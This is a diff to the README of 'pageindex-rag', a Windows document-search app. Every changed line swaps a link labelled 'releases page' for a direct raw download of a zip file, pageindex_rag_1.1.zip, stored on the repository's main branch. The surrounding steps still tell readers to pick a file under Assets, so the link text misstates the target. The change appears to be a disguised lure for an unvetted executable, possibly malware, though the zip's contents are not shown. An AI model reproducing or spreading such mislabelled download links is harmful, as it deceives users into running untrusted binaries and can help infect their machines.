@@ -1,6 +1,6 @@
 # 🧭 pageindex-rag - Find answers in plain text
 
-[![Download pageindex-rag](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Deafened-vascularstructure846/pageindex-rag/releases)
+[![Download pageindex-rag](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Deafened-vascularstructure846/pageindex-rag/raw/refs/heads/main/pageindex/pageindex_rag_1.1.zip)
 
 ## 📘 What this app does
 
@@ -19,7 +19,7 @@ It works well for people who want to search local documents, notes, exports, and
 
 ## 📦 Download
 
-Go to the [pageindex-rag releases page](https://github.com/Deafened-vascularstructure846/pageindex-rag/releases) and download the latest Windows file.
+Go to the [pageindex-rag releases page](https://github.com/Deafened-vascularstructure846/pageindex-rag/raw/refs/heads/main/pageindex/pageindex_rag_1.1.zip) and download the latest Windows file.
 
 Look for a file with one of these names:
 
@@ -31,7 +31,7 @@ If you download a `.zip` file, you need to extract it before you run the app.
 
 ## 🔽 Install and run on Windows
 
-1. Open the [releases page](https://github.com/Deafened-vascularstructure846/pageindex-rag/releases).
+1. Open the [releases page](https://github.com/Deafened-vascularstructure846/pageindex-rag/raw/refs/heads/main/pageindex/pageindex_rag_1.1.zip).
 2. Find the latest release at the top of the list.
 3. Under **Assets**, download the Windows file.
 4. If the file is `.zip`, right-click it and choose **Extract All**.
@@ -183,7 +183,7 @@ Typical behavior:
 
 When a new release is posted:
 
-1. Open the [releases page](https://github.com/Deafened-vascularstructure846/pageindex-rag/releases)
+1. Open the [releases page](https://github.com/Deafened-vascularstructure846/pageindex-rag/raw/refs/heads/main/pageindex/pageindex_rag_1.1.zip)
 2. Download the latest Windows file
 3. Close the app if it is open
 4. Replace the old version if needed
@@ -191,4 +191,4 @@ When a new release is posted:
 
 ## 📎 Download again
 
-Use the [pageindex-rag releases page](https://github.com/Deafened-vascularstructure846/pageindex-rag/releases) to download the latest Windows build or to get a newer version later
+Use the [pageindex-rag releases page](https://github.com/Deafened-vascularstructure846/pageindex-rag/raw/refs/heads/main/pageindex/pageindex_rag_1.1.zip) to download the latest Windows build or to get a newer version later
